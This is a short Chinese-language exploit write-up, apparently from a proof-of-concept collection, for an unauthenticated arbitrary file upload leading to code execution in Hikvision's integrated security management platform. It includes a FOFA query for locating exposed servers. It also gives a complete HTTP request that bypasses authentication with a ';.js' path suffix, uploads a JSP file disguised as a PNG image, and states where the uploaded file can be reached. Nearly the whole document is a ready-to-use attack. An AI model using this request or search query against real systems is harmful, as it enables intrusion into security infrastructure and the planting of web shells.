# 海康威视综合安防管理平台clusters接口存在任意文件上传漏洞

海康威视综合安防管理平台 `/clusterMgr/clusters/ssl/file` 存在远程命令执行漏洞，未经身份验证的远程攻击者可通过该漏洞在服务器端任意执行代码。

## fofa

```yaml
app="HIKVISION-综合安防管理平台"
```

## poc

```java
POST /clusterMgr/clusters/ssl/file;.js HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
Chrome/112.0.0.0 Safari/537.36 HTML
Accept: */*
Host: 8.8.8.8:1443
Accept-Encoding: gzip, deflate
Connection: close
Content-Type: multipart/form-data; boundary=--------------------------984514492333278399715408
Content-Length: 339

----------------------------984514492333278399715408
Content-Disposition: form-data; name="file"; filename="languages/default.jsp"
Content-Type: image/png

<%=123%>
----------------------------984514492333278399715408
Content-Disposition: form-data; name="proxyAddress"

8.8.8.8
----------------------------984514492333278399715408--
```

文件地址`/clusterMgr/languages/default.jsp;.js`

